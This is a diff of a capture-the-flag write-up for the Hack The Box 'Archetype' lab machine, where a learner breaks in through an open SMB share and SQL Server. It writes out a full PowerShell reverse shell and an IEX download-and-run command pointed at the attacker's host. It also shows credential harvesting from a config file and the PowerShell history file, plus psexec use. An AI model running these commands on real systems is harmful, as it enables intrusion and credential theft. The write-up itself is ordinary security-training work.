@@ -9,37 +9,37 @@ I am going to have a quick night of attempting the "Starting Point" machines in 
 
 # The Short Version
 <ol>
-	<li>Enumerate ports via `nmap -sC -sV 10.10.10.27`.  Optionally add the `archetype` machine to your `/etc/hosts` file for a nicer way of referencing this machine.</li>
-    <li>Run `smbclient -N -L \\\\10.10.10.27\\` to list the directories in the samba storage.  Notice `backups` is open access;</li>
-    <li>Run `smbclient -N \\\\10.10.10.27\\backups` to peek inside the `backups` directory.  Notice the `prod.dtsConfig` file inside;</li>
-    <li>Get the `prod.dtsConfig` by running `get prod.dtsConfig` in the samba client;</li>
-    <li>In your own shell, now run `cat prod.dtsConfig | awk -F'User ID=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"` to get the username, and `cat prod.dtsConfig | awk -F'Password=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"` to get the password;</li>
-    <li>Ensure you have Impacket's tools: `git clone https://github.com/SecureAuthCorp/impacket`;</li>
-    <li>We can access the `mssql` server using Impacket's `mssqlclient` tool: `python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`.  Notice here the use of the username from two steps ago.  When prompted, enter the password obtained from two steps ago;</li>
+	<li>Enumerate ports via <code>nmap -sC -sV 10.10.10.27</code>.  Optionally add the <code>archetype</code> machine to your <code>/etc/hosts</code> file for a nicer way of referencing this machine.</li>
+    <li>Run <code>smbclient -N -L \\\\10.10.10.27\\</code> to list the directories in the samba storage.  Notice <code>backups</code> is open access;</li>
+    <li>Run <code>smbclient -N \\\\10.10.10.27\\backups</code> to peek inside the <code>backups</code> directory.  Notice the <code>prod.dtsConfig</code> file inside;</li>
+    <li>Get the <code>prod.dtsConfig</code> by running <code>get prod.dtsConfig</code> in the samba client;</li>
+    <li>In your own shell, now run <code>cat prod.dtsConfig | awk -F'User ID=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"</code> to get the username, and <code>cat prod.dtsConfig | awk -F'Password=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"</code> to get the password;</li>
+    <li>Ensure you have Impacket's tools: <code>git clone https://github.com/SecureAuthCorp/impacket</code>;</li>
+    <li>We can access the <code>mssql</code> server using Impacket's <code>mssqlclient</code> tool: <code>python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code>.  Notice here the use of the username from two steps ago.  When prompted, enter the password obtained from two steps ago;</li>
     <li>
-		Now that you are logged in as `sql_svc`, we can run the following series of SQL commands to access the command shell:
-		```sql
+		Now that you are logged in as <code>sql_svc</code>, we can run the following series of SQL commands to access the command shell:
+		<code>sql
 		sp_configure 'show advanced options', '1'
 		RECONFIGURE
 		sp_configure 'xp_cmdshell', '1'
 		RECONFIGURE -- ;
-		```
+		</code>
 	</li>
-    <li>We need to note down your `tun0` IP.  On your computer, run: `ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'`;</li>
+    <li>We need to note down your <code>tun0</code> IP.  On your computer, run: <code>ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
 	<li>
-		We need to put the following into a `shell.ps1` file on your computer:
-		```ps
+		We need to put the following into a <code>shell.ps1</code> file on your computer:
+		<code>ps
 		$client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
-		```
-	Notice that we have your `tun0` IP, with some port number (here we have chosen `1234`) near the start of the file;
+		</code>
+	Notice that we have your <code>tun0</code> IP, with some port number (here we have chosen <code>1234</code>) near the start of the file;
 	</li>
-    <li>On your computer, we need to set up an http server for later; run `sudo python3 -m http.server 80`.  Ensure you run this in the same directory as your reverse powershell script from the previous step;</li>
-    <li>Also on your computer, we will need a netcat listener; run `nc -nvlp 1234` (or exchange `1234` with the port you chose two steps ago.  Note that in the verbatim version, I used this along with `rlwrap` to make this step nicer);</li>
-    <li>Back in the SQL window, now run `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");"` in order to transfer the reverse powershell script to the SQL database;</li>
-    <li>Go back to you netcat listener window, and you will see that it has connected to the server!  You can verify this by running `whoami`.  You can now run `more \users\sql_svc\desktop\user.txt` to capture the user flag!;</li>
-    <li>This privilege escalation is simple: it only relies on the powershell history file, which requires no higher rights to acces.  Simply run: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and you will see a username and a password;</li>
-    <li>Going back to your computer, we now need to log into the `administrator` user.  We can do this using another one of Impacket's scripts: `psexec.py`: `python3 impacket/examples/psexec.py administrator@archetype`.  Enter the password found in the previous step when prompted;</li>
-	<li>Now you are logged into the administrator, you can capture the root flat: `more \users\administrator\desktop\root.txt`, and you are finished!</li>
+    <li>On your computer, we need to set up an http server for later; run <code>sudo python3 -m http.server 80</code>.  Ensure you run this in the same directory as your reverse powershell script from the previous step;</li>
+    <li>Also on your computer, we will need a netcat listener; run <code>nc -nvlp 1234</code> (or exchange <code>1234</code> with the port you chose two steps ago.  Note that in the verbatim version, I used this along with <code>rlwrap</code> to make this step nicer);</li>
+    <li>Back in the SQL window, now run <code>xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");"</code> in order to transfer the reverse powershell script to the SQL database;</li>
+    <li>Go back to you netcat listener window, and you will see that it has connected to the server!  You can verify this by running <code>whoami</code>.  You can now run <code>more \users\sql_svc\desktop\user.txt</code> to capture the user flag!;</li>
+    <li>This privilege escalation is simple: it only relies on the powershell history file, which requires no higher rights to acces.  Simply run: <code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> and you will see a username and a password;</li>
+    <li>Going back to your computer, we now need to log into the <code>administrator</code> user.  We can do this using another one of Impacket's scripts: <code>psexec.py</code>: <code>python3 impacket/examples/psexec.py administrator@archetype</code>.  Enter the password found in the previous step when prompted;</li>
+	<li>Now you are logged into the administrator, you can capture the root flat: <code>more \users\administrator\desktop\root.txt</code>, and you are finished!</li>
 </ol>
 
 # The Long (Verbatim) Version
@@ -56,7 +56,7 @@ PORT     STATE SERVICE      VERSION
 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
 1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
-| ms-sql-ntlm-info: 
+| ms-sql-ntlm-info:
 |   Target_Name: ARCHETYPE
 |   NetBIOS_Domain_Name: ARCHETYPE
 |   NetBIOS_Computer_Name: ARCHETYPE
@@ -71,30 +71,30 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 Host script results:
 |_clock-skew: mean: 1h45m06s, deviation: 3h07m50s, median: 21m05s
-| ms-sql-info: 
-|   10.10.10.27:1433: 
-|     Version: 
+| ms-sql-info:
+|   10.10.10.27:1433:
+|     Version:
 |       name: Microsoft SQL Server 2017 RTM
 |       number: 14.00.1000.00
 |       Product: Microsoft SQL Server 2017
 |       Service pack level: RTM
 |       Post-SP patches applied: false
 |_    TCP port: 1433
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
 |   Computer name: Archetype
 |   NetBIOS computer name: ARCHETYPE\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2021-03-22T02:38:03-07:00
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
+| smb2-security-mode:
+|   2.02:
 |_    Message signing enabled but not required
-| smb2-time: 
+| smb2-time:
 |   date: 2021-03-22T09:38:04
 |_  start_date: N/A
 
@@ -225,7 +225,7 @@ msf6 exploit(windows/http/ssrs_navcorrector_viewstate) > show info
        Name: SQL Server Reporting Services (SSRS) ViewState Deserialization
      Module: exploit/windows/http/ssrs_navcorrector_viewstate
    Platform: Windows
-       Arch: 
+       Arch:
  Privileged: Yes
     License: Metasploit Framework License (BSD)
        Rank: Excellent
@@ -275,10 +275,10 @@ Basic options:
 Payload information:
 
 Description:
-  A vulnerability exists within Microsoft's SQL Server Reporting 
-  Services which can allow an attacker to craft an HTTP POST request 
-  with a serialized object to achieve remote code execution. The 
-  vulnerability is due to the fact that the serialized blob is not 
+  A vulnerability exists within Microsoft's SQL Server Reporting
+  Services which can allow an attacker to craft an HTTP POST request
+  with a serialized object to achieve remote code execution. The
+  vulnerability is due to the fact that the serialized blob is not
   signed by the server.
 
 References:
@@ -326,7 +326,7 @@ smb: \> ls
   prod.dtsConfig                     AR      609  Tue Jan 21 01:23:02 2020
 
                 10328063 blocks of size 4096. 8260396 blocks available
-smb: \> 
+smb: \>
 ```
 
 Note that another command for `ls` is `dir` in samba client.
@@ -364,7 +364,7 @@ Password:
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
 [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
 [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
 [!] Press help for extra shell commands
 SQL>
 ```
@@ -390,7 +390,7 @@ This is curious; particularly the `xp_cmdshell` ones...  We need a way to change
 sp_configure 'show advanced options', '1'
 RECONFIGURE
 -- this enables xp_cmdshell
-sp_configure 'xp_cmdshell', '1' 
+sp_configure 'xp_cmdshell', '1'
 RECONFIGURE
 ```
 
@@ -422,10 +422,10 @@ SQL> xp_cmdshell "python -c 'import pty; pty.spawn("/bin/bash")'"
 
 However, I searched online and found this, which will enumerate ports on the system (using powershell) so that we can get a reverse shell:
 ```ps
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close() 
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
 ```
 
-We need to change the IP address to your `tun0` one: 
+We need to change the IP address to your `tun0` one:
 ```bash
 $ ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])';
 10.10.14.34
@@ -455,7 +455,7 @@ Traceback (most recent call last):
 PermissionError: [Errno 13] Permission denied
                                                                                                                                                                         
 $ sudo python3 -m http.server 80                                                                                                                                  1 ⨯
-[sudo] password for jakeireland: 
+[sudo] password for jakeireland:
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
